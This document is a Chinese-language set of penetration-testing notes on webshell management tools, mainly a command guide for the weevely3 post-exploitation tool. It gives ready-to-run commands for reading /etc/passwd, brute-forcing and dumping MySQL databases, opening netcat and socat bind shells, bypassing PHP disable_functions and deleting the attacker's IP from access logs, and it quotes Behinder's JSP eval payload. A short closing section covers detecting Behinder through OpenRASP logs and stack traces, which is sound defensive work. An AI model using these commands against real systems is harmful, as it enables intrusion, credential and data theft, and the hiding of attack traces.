### Webshell管理工具

主控端proxy可"隐藏"主控端IP 亲测可用

|webshell名称|主控端|目标环境|主控端proxy|描述|
|:-------------:|--|--|-----|----|
|[epinna/weevely3](https://github.com/epinna/weevely3)|python2| php | [shell proxy](sec_proxy.md#shell-proxy)|更适合linux环境下的后渗透 |
|[rebeyond/Behinder](https://github.com/rebeyond/Behinder)|Java|php/Java/.NET|自带 http(s) proxy|“冰蝎” 动态二进制加密 webshell管理端|
|[ABPTTS](https://github.com/nccgroup/ABPTTS)|python|.jsp .war .aspx|/|TCP tunneling over HTTP/HTTPS for web application servers. [Black Hat USA 2016](https://www.blackhat.com/us-16/arsenal.html#a-black-path-toward-the-sun) |


#### weevely3的后渗透功能总结

* 主机信息搜集(详细内容参考其他笔记)
  * 工具命令`system_info` 查看当前webshell文件位置 操作系统类型 根目录 php版本 当前用户名 外网IP 等
  * 工具命令`system_procs` 列出进程
  * 工具命令`:system_extensions` 查看php和web中间件信息 能看到apache_modules等信息
  * 工具命令`:audit_phpconf`
  * 工具命令`:audit_filesystem`  查看linux下关键目录 寻找 可写/可读/可执行 文件
* 文件操作
  * 读取文件命令`:audit_etcpasswd` 读取passwd文件(需要足够的权限)
  * 创建文件命令`touch -human-ts '2019-05-29 16:21:42' test.php` 创建文件 可设置创建时间
  * 下载文件命令`:file_download result.zip /Users/xxx/Downloads/result.zip` 把目标站的`result.zip` 下载到本地`Downloads/result.zip`
  * 上传文件命令`:file_upload /Users/xxx/Downloads/1.png file.png -force -vector fwrite`把本地文件/数据 上传到 远程目标站`file.png` 参数`-force`表示如果文件存在则强制覆盖
  * 上传文件命令`:file_upload -content "testdata" data.php` 把本地文件/数据 上传到 远程目标站`data.php`
  * 压缩文件命令`:file_zip site.zip ./` 把当前目录下所有文件压缩成site.zip 注意压缩过程可能被中断(判断方法是临时压缩文件大小不变) 建议重新执行压缩文件命令(实测某次压缩过程被中断6次才压缩成功 最终压缩包大小为2G)
  * 压缩文件命令`:file_gzip site.gz ./` 只支持linux
  * 搜索内容命令`:file_grep ./ "pass"` 不建议搜索大目录
* net网络请求
  * 端口扫描 - 使用PHP函数[fsockopen](https://www.php.net/manual/en/function.fsockopen.php)实现
    * 工具命令`:net_scan 127.0.0.1 21,22,80,443,1433,3306,3389,7001`
  * proxy
    * 工具命令`:net_proxy` 使用目标主机发起http(s)请求
    * 工具命令`:net_curl http://ipconfig.io/json`  模拟curl 使用目标主机发起http(s)请求
* DB数据库操作
  * SQL交互
    * 工具命令`sql_console -user USER -passwd PASS123 -host 10.2.3.4` 连接MySQL成功则能交互式执行SQL语句
      * 对MySQL进行信息搜集 `SELECT version();` `show databases;`
  * 暴力枚举数据库用户名和口令 只支持mysql和pgsql
    * 工具命令`:bruteforce_sql mysql -hostname localhost -users root -pwds db123456 admin123` 简单枚举 成功会出现`root:pass`
    * 工具命令`:bruteforce_sql mysql -hostname localhost -users USERNAME1 USERNAME2 USERNAME3ROOT -fpwds wordlists/dic.txt`字典枚举
  * dump数据库到本地（前提是MySQL需要权限 可导出文件到某目录）
    * 常见问题:无权限导出文件
      * 查看MySQL权限 `show global variables like '%secure_file_priv%';` 如果查询结果为NULL 则没有权限直接使用SQL语句导入导出文件. 有变通方法
      * 保存sql查询的结果即可 ```SELECT * FROM `table1`;```
        * 常见问题:如果sql查询的结果数据过多 导致sql查询超时? 也有变通方法
        * 先确定数据条数 ```SELECT COUNT(*) FROM `table1`;``` 
        * 再分多次查询 ```SELECT * FROM `table1` ORDER BY `id` ASC LIMIT 0,20;``` 从第1条数据开始(起点) 查询得到20条数据(数据量) 下次`LIMIT 20,20`再得到20条数据 ... 以此类推 最后拼接查询结果 得到整个表的数据
    * 实现dump方式1 使用php实现(默认) 支持mysql,pgsql,sqlite,dblib  php代码见[weevely3/mysqldump.tpl](https://github.com/epinna/weevely3/blob/master/modules/sql/_dump/mysqldump.tpl) 原项目为[mysqldump-php](https://github.com/ifsnop/mysqldump-php)
    * 工具命令 `:sql_dump DBname DBuser DBpass -dbms mysql -host localhost:3306` 把数据库dump 下载保存到本地目录`/var`下. 可指定保存为本地文件`-lpath /Users/xxx/Downloads/db1.sqldump`
    * 实现dump方式2 执行系统命令(只支持MySQL) 使用weevely中定义的php类`ShellCmd`执行系统命令启动`mysqldump`程序实现
    * 工具命令 `:sql_dump DBname DBuser DBpass -dbms mysql -host localhost:3306 -vector mysqldump_sh`
  * 数据复原:将得到的数据库文件`xx.sqldump`(内容为sql语句) 导入到MySQL数据库
    * 自搭mysqld服务 并登录`mysql -u root -p`
    * 使用MySQL命令 创建 新数据库`CREATE DATABASE new_database;`
    * 在shell下导入数据库文件`data.sqldump`到新数据库`new_database` 命令`mysql -u username -p new_database < xx.sqldump`
* 派生shell
  * 正向shell`:backdoor_tcp`
    * 工具命令`:backdoor_tcp 8811 -vector netcat` 在目标主机(被控端)公网IP上开启端口监听 1.1.1.1:8811   主控端执行`nc 1.1.1.1 8811`
    * 工具命令`:backdoor_tcp 8811 -vector netcat_bsd`
    * 工具命令`:backdoor_tcp 8811 -vector python_pty`
    * 工具命令`:backdoor_tcp 8811 -vector socat`
  * 反向shell`:backdoor_reversetcp`
* 命令交互
  * 执行PHP代码 - `:shell_php "phpinfo();"`
  * 执行系统命令 - `:shell_sh pwd -vector proc_open`
  * bypass disable_functions 方法1 - 使用Apache的mod_cgi模块和`.htaccess`文件
    * 工具命令`:audit_disablefunctionbypass` 如果失败会提示
    * 利用前提:Apache使用了mod_cgi模块
    * 问题:php的配置文件`php.ini`中`disable_functions=`说明了禁止执行的php函数，如`exec()`等
    * 启动模块`:audit_disablefunctionbypass` 注意：会上传2个文件 `.htaccess` 和 CGI脚本 `acubu.ved`
    * 通过CGI脚本启动的独立进程`acubu.ved` 即可实现伪终端 进行命令交互 如`ps -aux` `whoami` 等
    * 不需要执行命令则可删除之前上传的2个文件 `:file_rm .htaccess` `:file_rm acubu.ved`
    * 如果不删除之前上传的2个文件 则下次可以直接启动CGI脚本 实现伪终端命令交互 `:audit_disablefunctionbypass -just-run http://localhost/acubu.ved`
  * bypass disable_functions 方法2 - json serializer的UAF漏洞
      * PHP 7.1-7.3 [PHP :: Bug #77843 :: Use after free with json serializer](https://bugs.php.net/bug.php?id=77843) [exploits](https://github.com/mm0r1/exploits/tree/master/php-json-bypass)
* 攻击痕迹清理(详细内容参考其他笔记)
  * 删除某文件(access.log)中 有1.1.1.1的那些行(实测不一定成功 看权限)  自带[3种实现方式](https://github.com/epinna/weevely3/blob/caf8978a50754892f7282d451ad18ab417600636/modules/file/clearlog.py)
    * 使用php代码实现`:file_clearlog -vector php_clear 1.1.1.1 access.log`
    * 使用sed命令实现`:file_clearlog -vector clearlog 1.1.1.1 access.log`
    * 使用sed命令实现`:file_clearlog -vector old_school 1.1.1.1 access.log`

### 检测案例1 - 通过堆栈检测未知webshell(可发现冰蝎webshell)

冰蝎webshell的JSP版本通过自定义ClassLoader + defineClass方法来实现eval特性。
```
new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
```

因为冰蝎webshell使用了加密通信流量(AES双向加密)，可绕过WAF/IDS等系统

检测方法:

该检测方法参考自[百度安全实验室](https://mp.weixin.qq.com/s?src=11&timestamp=1562667020&ver=1718&signature=d-uJaXrL7n3rxgaAIbCwhNwsmR30j*WEc-6KntSfDK53VoJSUODDlwvvxEiF3Y5oN*8PnkZChi5DtxhyhtULFDryXwj927jCv1H2KWYADcTU-VHxlZas6QlTRVxkSkoP&new=1)

部署在web应用内部的OpenRASP能够看到后门操作日志（需安装 999-event-logger 插件）:
```
[event-logger] Listing directory content: /
[event-logger] Execute command: whoami
```

同样，可通过"命令执行"的堆栈进行检测:
```
java.lang.ProcessBuilder.start
...
net.rebeyond.behinder.payload.java.Cmd.RunCMD
net.rebeyond.behinder.payload.java.Cmd.equals
```
